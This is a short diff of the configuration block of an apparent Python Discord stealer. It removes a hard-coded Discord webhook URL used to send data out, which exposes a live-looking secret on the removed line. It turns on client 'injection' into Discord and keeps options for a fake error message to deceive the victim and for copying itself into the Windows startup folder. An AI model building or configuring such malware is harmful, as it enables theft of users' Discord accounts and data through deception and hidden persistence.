@@ -32,9 +32,9 @@ import win32clipboard
 ### CONFIG ### 
 
 
-webhook = 'https://discord.com/api/webhooks/1102253728842657843/7LX8d74soZhJ_JetMdiWZTD2QF7-8JlnuNoArjDgP2UAv_Z3u0xl3smsoCuiWFeRZ63l' #Put ur webhook
+webhook = '' #Put ur webhook
 
-injection = False # If set to False it will not inject into discord
+injection = True # If set to False it will not inject into discord
 fakeerror = True # If True it will make an fake error message at the end
 Startup = True # If True it will add the file into the startup folder
 shitty_message = True # If True it will print fake message, if you want to disable it replace with False
